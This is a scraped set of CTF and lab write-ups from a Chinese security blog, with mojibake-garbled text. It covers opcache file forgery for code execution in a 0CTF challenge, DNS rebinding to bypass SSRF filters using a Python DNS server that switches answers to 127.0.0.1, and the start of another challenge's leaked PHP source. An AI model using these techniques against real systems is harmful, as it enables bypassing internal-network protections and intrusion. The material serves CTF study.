<h2 id="binæ–‡ä»¶ç»“æ„åˆ†æ"><a href="#binæ–‡ä»¶ç»“æ„åˆ†æ" class="headerlink" title="binæ–‡ä»¶ç»“æ„åˆ†æ"></a>binæ–‡ä»¶ç»“æ„åˆ†æ</h2><p>ä¾ç„¶åœ¨åˆšæ‰ç»™å‡ºçš„é“¾æ¥ä¸­ä¸‹è½½åˆ†ææ¨¡æ¿ï¼Œå¹¶åœ¨010editorä¸­å¯¼å…¥ï¼Œä¸è¦ç”¨010editorè‡ªå¸¦çš„åˆ†ææ¨¡æ¿æœ‰å‘ã€‚ç”¨çº¢è‰²æ¡†æ ‡æ³¨çš„åœ°æ–¹å°±æ˜¯å’Œç›®æ ‡æœåŠ¡å™¨ä¸ä¸€æ ·éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ï¼ŒåŸè°…æˆ‘å•°å—¦ä¸€éï¼Œè¿™ä¸‰ä¸ªæ¡†åˆ†åˆ«ä»£è¡¨system_id, æ—¶é—´æˆ³ï¼Œè·¯å¾„ã€‚</p>
<p><img src="fenxi.png" alt="fenxi.png"></p>
<h2 id="å®éªŒéªŒè¯"><a href="#å®éªŒéªŒè¯" class="headerlink" title="å®éªŒéªŒè¯"></a>å®éªŒéªŒè¯</h2><p>kali phpinfo.php<br>ubuntu phpinfo.php</p>
<p><img src="kaliphpinfo.png" alt="kaliphpinfo.png"></p>
<p>æ‹¿åˆ°kaliçš„phpinfo binæ–‡ä»¶</p>
<p><img src="ubuntuphpinfo.png" alt="ubuntuphpinfo.png"></p>
<p>ä¿®æ”¹æ—¶é—´æˆ³ system_id</p>
<p><img src="c1.png" alt="c1.png"></p>
<p>å¤åˆ¶ubuntuç›¸åº”æ–‡ä»¶ä¸­ç„¶åé‡æ–°è®¿é—®</p>
<p><img src="c2.png" alt="c2.png"></p>
<p><img src="ubuntunewphpinfo.png" alt="ubuntunewphpinfo.png"></p>
<h2 id="CTFä¸­"><a href="#CTFä¸­" class="headerlink" title="CTFä¸­"></a>CTFä¸­</h2><p>è¿™æ¬¡åœ¨0ctfé‡åˆ°äº†è¿™ç§æ”»å‡»æ–¹å¼ï¼Œä»£ç æ˜¯è¿™æ ·çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir . <span class="string">"index.php"</span>))&#123;</span><br><span class="line">  touch($dir . <span class="string">"index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//å¦‚æœä¸æ˜¯ç›®å½•å°±åˆ é™¤</span></span><br><span class="line">  <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">    unlink($dir);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;<span class="comment">//åˆ é™¤é. ..çš„æ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">foreach</span> (scandir($dir) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($file, [<span class="string">"."</span>, <span class="string">".."</span>])) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($dir . $file);</span><br><span class="line">  &#125;<span class="comment">//åˆ é™¤ç›®å½•</span></span><br><span class="line">  rmdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'phpinfo'</span>:</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"phpinfo.txt"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'reset'</span>:</span><br><span class="line">    clear($dir);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'time'</span>:</span><br><span class="line">    <span class="keyword">echo</span> time();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"name"</span>]) || !<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"go in to upload"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $name = $dir . $_GET[<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"go in to move"</span>;</span><br><span class="line">    var_dump($name);</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $name);</span><br><span class="line">    $size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (scandir($dir) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">      <span class="keyword">if</span> (in_array($file, [<span class="string">"."</span>, <span class="string">".."</span>])) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      $size += filesize($dir . $file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($size &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    ini_set(<span class="string">"open_basedir"</span>, <span class="string">"/var/www/html/$dir:/var/www/html/flag"</span>);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>?action=phpinfoå¯ä»¥å¾—åˆ°system_id<br><code>7.0.28API3 151012,NTSBIN_SIZEOF_CHAR48888 -&gt; 7badddeddbd076fe8352e80d8ddf3e73</code></p>
<p>?action=pwd æ‹¿åˆ°è‡ªå·±è·¯å¾„<code>sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/</code></p>
<p>ç»“åˆä¸Šé¢çš„ä¸¤ä¸ªè¿›ä¸€æ­¥æ¨æ–­å‡ºç¼“å­˜è·¯å¾„<code>/tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php</code></p>
<p>åœ¨è‡ªå·±æœ¬åœ°ç¯å¢ƒä¸­å»ºç«‹<code>sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php</code>å¹¶å†™ä¸Šè‡ªå·±çš„payload,<strong>åˆ‡è®°è¿™ä¸€ç‚¹å½“æ—¶æ²¡æœ‰åšå‡ºæ¥å°±æ˜¯æœ¬åœ°æ²¡æœ‰å»ºç«‹ä¸€æ¨¡ä¸€æ ·çš„è·¯å¾„ã€‚</strong>ç›®æµ‹éƒ½æœ‰banå‡½æ•°ï¼Œæ‰€ä»¥å°±çº¯å†™äº†ä¸€ç‚¹ä¸œè¥¿ï¼ŒéªŒè¯çº¿ä¸Šæ˜¯å¦èƒ½è¾“å‡ºã€‚</p>
<p><img src="test.png" alt="test.png"></p>
<p>ç„¶åæµ‹è¯•äº†<code>glob</code>ï¼Œå‘ç°æ²¡æœ‰ç»“æœæœ€åç”¨</p>
<p>è¯»åˆ°ç›®å½•ï¼Œç„¶åç”¨ä¹‹å‰ç»™çš„ä»£ç ä¸­å·²ç»ä½¿ç”¨çš„high_lightè¯»æ–‡ä»¶ï¼ˆè‚¯å®šä¸ä¼šè¢«banï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"/var/wwwml/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="dir.png" alt="dir.png"></p>
<p><img src="content.jpg" alt="content.jpg"></p>
<p>è¯»å‡ºæ¥åˆæ˜¯æ˜¯ä¸€ä¸ªbinæ–‡ä»¶ï¼Œä¸ä¼šé€†ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS rebinding</title>
    <url>/2018/01/28/DNS%20rebinding/</url>
    <content><![CDATA[<!-- åˆ©ç”¨æœåŠ¡å™¨ä¸¤æ¬¡è§£æåŒä¸€åŸŸåçš„çŸ­æš‚é—´éš™ï¼Œæ›´æ¢åŸŸåèƒŒåçš„ipè¾¾åˆ°çªç ´åŒæºç­–ç•¥æˆ–è¿‡wafè¿›è¡Œssrfçš„ç›®çš„ã€‚ -->
<!-- more -->

<h2 id="DNS-rebindingæ˜¯å•¥"><a href="#DNS-rebindingæ˜¯å•¥" class="headerlink" title="DNS rebindingæ˜¯å•¥"></a>DNS rebindingæ˜¯å•¥</h2><p>åˆ©ç”¨æœåŠ¡å™¨ä¸¤æ¬¡è§£æåŒä¸€åŸŸåçš„çŸ­æš‚é—´éš™ï¼Œæ›´æ¢åŸŸåèƒŒåçš„ipè¾¾åˆ°çªç ´åŒæºç­–ç•¥æˆ–è¿‡wafè¿›è¡Œssrfçš„ç›®çš„ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ä¸€èˆ¬ï¼Œè¿›è¡Œssrfé˜²å¾¡çš„æ¨¡å¼å¦‚ä¸‹ã€‚</p>
<p><img src="ssrf.jpg" alt="ssrf.jpg"></p>
<ol>
<li>è·å–åˆ°è¾“å…¥çš„URLï¼Œä»è¯¥URLä¸­æå–host </li>
<li>å¯¹è¯¥hostè¿›è¡ŒDNSè§£æï¼Œè·å–åˆ°è§£æçš„IP </li>
<li>æ£€æµ‹è¯¥IPæ˜¯å¦æ˜¯åˆæ³•çš„ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯ç§æœ‰IPç­‰</li>
<li>å¦‚æœIPæ£€æµ‹ä¸ºåˆæ³•çš„ï¼Œåˆ™è¿›å…¥curlçš„é˜¶æ®µå‘åŒ…</li>
</ol>
<p>è¿™æ ·çš„é€»è¾‘æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºç¬¬äºŒæ¬¡æœåŠ¡ç«¯å®Œå…¨å¯ä»¥ä¸ä½¿ç”¨urlå°±æ˜¯ä½¿ç”¨å·²è¢«æ£€æŸ¥è¿‡çš„ipã€‚</p>
<p>è¯šå¦‚å‰é¢æ‰€è¯´åŒä¸€urlè¢«ç”¨äº†ä¸¤æ¬¡ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥å°†TTLè°ƒåˆ°ä¸€ä¸ªéå¸¸å°çš„å€¼ï¼Œè®©ç¬¬ä¸€æ¬¡é€šè¿‡urlæ‹¿åˆ°çš„ipå¤±æ•ˆï¼Œç„¶ååœ¨curlçš„æ—¶å€™æœåŠ¡ç«¯å¿…é¡»å†è¿›è¡Œä¸€æ¬¡dnsè§£ææ‹¿åˆ°ipï¼Œè€Œè¿™ä¸ªipæ²¡æœ‰è¢«æ£€æŸ¥ï¼Œäºæ˜¯å°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†ã€‚<strong>åœ¨ssrfé‡Œé¢å°±æ˜¯ç¬¬ä¸€æ¬¡è§£æå‡ºå¤–ç½‘ipï¼Œç¬¬äºŒæ¬¡è§£æå‡ºå†…ç½‘ipã€‚</strong></p>
<h2 id="ä¸€ä¸ªdemo"><a href="#ä¸€ä¸ªdemo" class="headerlink" title="ä¸€ä¸ªdemo"></a>ä¸€ä¸ªdemo</h2><p>è¦å®ç°dnsé‡ç»‘å®šä¸€ä¸ªé‡è¦çš„æ¡ä»¶å°±æ˜¯å°†TTLè°ƒåˆ°æ¥è¿‘0çš„æ•°å­—ï¼Œä¸€èˆ¬çš„åŸŸåæœåŠ¡å•†æ˜¯ä¸å…è®¸TTLé‚£ä¹ˆä½çš„ã€‚æ‰€ä»¥åªæœ‰è‡ªå·±æ­æˆ–è€…è‡ªå·±å†™ä¸€ä¸ªdnsæœåŠ¡å™¨ã€‚è¿™é‡Œé€‰æ‹©ä½¿ç”¨fakednsåšä¸€ä¸ªç®€å•çš„å®éªŒåˆä½“éªŒã€‚</p>
<p>viä¸€ä¸ªdns.confå†™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A cl0und.site 12.34.56.78,127.0.0.1</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ†åˆ«digä¸¤æ¬¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @fakednsæ‰€åœ¨çš„ip cl0und.site</span><br></pre></td></tr></table></figure>

<p><img src="digdemo.jpg" alt="digdemo.jpg"></p>
<h2 id="å®Œæ•´å¤ç°"><a href="#å®Œæ•´å¤ç°" class="headerlink" title="å®Œæ•´å¤ç°"></a>å®Œæ•´å¤ç°</h2><p>å½“ç„¶æ¯”èµ›æˆ–è€…å®æˆ˜é‡Œé¢æ˜¯ä¸å¯èƒ½è‡ªå·±ä»»æ„æŒ‡å®šdnsæœåŠ¡å™¨è§£æï¼Œæ‰€ä»¥å¿…é¡»è‡ªå·±é…ç½®dnsè®°å½•ã€‚è²Œä¼¼é˜¿é‡Œæ˜¯å¯ä»¥é…ç½®nsè®°å½•çš„ã€‚æˆ‘ç”¨çš„å›½å¤–çš„åŸŸåæœåŠ¡å•†è²Œä¼¼æ¯”è¾ƒå‘è®¾ç½®nameserveré‚£é‡Œä¸å…è®¸ç”¨ipã€‚</p>
<p>ä¸è®²é“ç†ï¼Œçº ç»“äº†åŠå¤©æœ€ååœ¨ipåé¢åŠ xip.ioç»•è¿‡ã€‚</p>
<p><img src="ban.png" alt="ban.png"></p>
<p>nameserveræ›´æ–°çš„æ¯”è¾ƒæ…¢è¦åŠä¸ªå°æ—¶å·¦å³ã€‚</p>
<p><img src="bypass.png" alt="bypass.png"></p>
<p>åŠä¸ªå°æ—¶ä»¥å~<br><img src="dns1.jpg" alt="dns1.jpg"><br>å¯ä»¥çœ‹åˆ°æˆåŠŸæ˜¯æˆåŠŸäº†ï¼Œä½†æ˜¯ttlæœ‰300å®æˆ˜ä¸­åº”è¯¥æ˜¯ä¸å¯æ¥å—çš„ã€‚ä½†æ˜¯çœ‹æºç çš„æ—¶å€™å‘ç°ttlè®¾ç½®çš„1,å¾ˆè¿·</p>
<p>æ‰€ä»¥å»ç½‘ä¸Šå·äº†ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"12.34.56.78"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹å®‰è£…twistedåº“å¤±è´¥ï¼Œå®‰è£…ä¹‹å‰è¦å…ˆè£…ä¸€ä¸‹ï¼Œå¤‡å¿˜</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential autoconf libtool pkg-config python-opengl python-imaging python-pyrex python-pyside.qtopengl idle-python2.7 qt4-dev-tools qt4-designer libqtgui4 libqtcore4 libqt4-xml libqt4-test libqt4-script libqt4-network libqt4-dbus python-qt4 python-qt4-gl libgle3 python-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install twisted&#x3D;&#x3D;16.6.0</span><br><span class="line">pip install service-identity&#x3D;&#x3D;16.0.0</span><br></pre></td></tr></table></figure>

<p>åæ¥æ¨æ–­åº”è¯¥æ˜¯æ“ä½œçš„ç³»ç»Ÿçš„é”…ï¼Œç©ºç™½çš„é‚£ä¸€æ¬¡å®é™…ä¸Šæ˜¯è§£æå‡ºä¸œè¥¿äº†çš„ã€‚300ç§’è²Œä¼¼æ˜¯æ“ä½œç³»ç»Ÿå¼ºåˆ¶çš„ï¼ˆï¼Ÿï¼‰ã€‚</p>
<p>ä½†æ˜¯å®é™…ä¸Šå·²ç»æˆåŠŸäº†ï¼Œåœ¨kaliå’Œcentosä¸Šæµ‹äº†ä¸€ä¸‹éƒ½æ˜¯è¿™ä¸ªç»“æœã€‚</p>
<p><img src="kali.jpg" alt="kali.jpg"></p>
<p><img src="centos.png" alt="centos.png"></p>
<h2 id="ä¸ç¨³å®šçš„å·æ‡’æ–¹æ³•"><a href="#ä¸ç¨³å®šçš„å·æ‡’æ–¹æ³•" class="headerlink" title="ä¸ç¨³å®šçš„å·æ‡’æ–¹æ³•"></a>ä¸ç¨³å®šçš„å·æ‡’æ–¹æ³•</h2><h3 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h3><p>è¿™ä¸ªæ–¹æ³•ä¸éœ€è¦ï¼Œæœ‰è‡ªå·±çš„åŸŸåå’Œnameserverã€‚å› ä¸ºæœ‰äººå·²ç»å¸®å¤§å®¶å®ç°äº†ã€‚åªéœ€è¦æŠŠæƒ³ç”¨çš„<a href="https://www.adobe.com/devnet/flashplayer/articles/fplayer9_security.html">ipè½¬æ¢æˆ16è¿›åˆ¶</a>ï¼Œæ¯”å¦‚æƒ³åœ¨<code>127.0.0.1</code> å’Œ <code>192.168.0.1</code>äº’æ¢é‚£ä¹ˆåªéœ€è¦ï¼Œé”®å…¥ip<code>7f000001.c0a80001.rbndr.us</code></p>
<p>ç„¶åå°±æ˜¯çœ‹è„¸äº†ã€‚éšæœºè¯•äº†ä¸€è½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br></pre></td></tr></table></figure>

<h3 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h3><p>åœ¨bendawangå¸ˆå‚…çš„åšå®¢çœ‹åˆ°çš„è‡ªå·±è®¾ç½®ä¸¤ä¸ªAè®°å½•ä¸€ä¸ªå†…ç½‘,ä¸€ä¸ªå¤–ç½‘ã€‚å»è£…å¤–ç½‘å…ˆè¿”å›å†…ç½‘åè¿”å›è¿™ä¸ªæ¦‚ç‡ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505">https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505</a></p>
<p><a href="https://github.com/taviso/rbndr/">https://github.com/taviso/rbndr/</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°å½•ä¸€é“é¢˜çš„å¤šç§è§£æ³•</title>
    <url>/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/</url>
    <content><![CDATA[<!-- é¢˜ç›®æ˜¯ï¼šå·¥æ§äº‘ç®¡ç†ç³»ç»Ÿå®¢æœä¸­å¿ƒå­˜åœ¨æ¼æ´ï¼Œflagå°±åœ¨flag/flag/flag/flag/flag/flag/flag.phpæ–‡ä»¶é‡Œé¢ã€‚ -->
<!-- more -->
<p>é€šè¿‡å¤‡ä»½æ–‡ä»¶æ³„éœ²æ‹¿åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($page)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'uploaded'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no uploaded uploaded uploaded uploaded !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'://f'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no ://f ://f ://f'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'ata'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no ata ata ata'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'0'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no 0 0 0'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"./includes/$page.php"</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(file_exists(<span class="string">"./includes/$page"</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File is not exit "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($adfile, $file)</span></span>&#123;</span><br><span class="line">  <span class="comment">//Only Administrators can download files .</span></span><br><span class="line">      $cert = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($adfile) &amp;&amp; file_get_contents($adfile, <span class="string">'r'</span>) === <span class="string">'Yeah Everything Will Be Ok My Boss'</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Welcome ! You Are Administrator !"</span>;</span><br><span class="line">      $cert = <span class="string">'Y'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> 